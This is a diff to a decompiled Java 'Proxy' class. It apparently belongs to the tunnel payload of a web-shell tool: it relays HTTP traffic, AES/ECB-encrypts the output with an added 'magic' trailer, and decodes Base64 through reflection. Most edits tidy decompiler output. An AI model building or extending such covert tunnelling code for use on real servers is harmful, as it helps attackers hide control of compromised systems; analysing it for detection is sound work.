@@ -102,7 +102,7 @@ public class Proxy {
                while(var6.hasNext()) {
                   String headerName = (String)var6.next();
                   if (headerName != null && headerName.equalsIgnoreCase("Set-Cookie")) {
-                     ((Map)headers).put("Cookie", responseHeader.get(headerName));
+                     ((Map)headers).put("Cookie", (String)responseHeader.get(headerName));
                   }
                }
 
@@ -226,9 +226,8 @@ public class Proxy {
 
    private byte[] readLine(InputStream in) throws IOException {
       ByteArrayOutputStream bos = new ByteArrayOutputStream();
-      boolean var3 = true;
+      int c = 0;
 
-      int c;
       while((c = in.read()) != -1 && c != 10 && c != 13) {
          bos.write(c);
       }
@@ -276,14 +275,13 @@ public class Proxy {
          String encoding = conn.getContentEncoding();
          DataInputStream din;
          byte[] buffer;
-         boolean var24;
          if (encoding != null) {
             if (encoding != null && encoding.equals("gzip")) {
                din = null;
                GZIPInputStream gZIPInputStream = new GZIPInputStream(conn.getInputStream());
                din = new DataInputStream(gZIPInputStream);
                buffer = new byte[1024];
-               boolean var13 = false;
+               length = 0;
 
                while((length = din.read(buffer)) != -1) {
                   bos.write(buffer, 0, length);
@@ -291,7 +289,7 @@ public class Proxy {
             } else {
                din = new DataInputStream(conn.getInputStream());
                buffer = new byte[1024];
-               var24 = false;
+               length = 0;
 
                while((length = din.read(buffer)) != -1) {
                   bos.write(buffer, 0, length);
@@ -300,7 +298,7 @@ public class Proxy {
          } else {
             din = new DataInputStream(conn.getInputStream());
             buffer = new byte[1024];
-            var24 = false;
+            length = 0;
 
             while((length = din.read(buffer)) != -1) {
                bos.write(buffer, 0, length);
@@ -323,7 +321,7 @@ public class Proxy {
       } else {
          DataInputStream din = new DataInputStream(conn.getErrorStream());
          byte[] buffer = new byte[1024];
-         boolean var21 = false;
+         length = 0;
 
          while((length = din.read(buffer)) != -1) {
             bos.write(buffer, 0, length);
@@ -340,7 +338,10 @@ public class Proxy {
       Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
       cipher.init(1, skeySpec);
       byte[] encrypted = cipher.doFinal(bs);
-      return encrypted;
+      ByteArrayOutputStream bos = new ByteArrayOutputStream();
+      bos.write(encrypted);
+      bos.write(this.getMagic());
+      return bos.toByteArray();
    }
 
    private void fillContext(Object obj) throws Exception {
@@ -369,12 +370,12 @@ public class Proxy {
             this.getClass();
             Base64 = Class.forName("java.util.Base64");
             Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
-            result = (byte[])((byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, text));
+            result = (byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, text);
          } else {
             this.getClass();
             Base64 = Class.forName("sun.misc.BASE64Decoder");
             Decoder = Base64.newInstance();
-            result = (byte[])((byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, text));
+            result = (byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, text);
          }
       } catch (Exception var6) {
       }
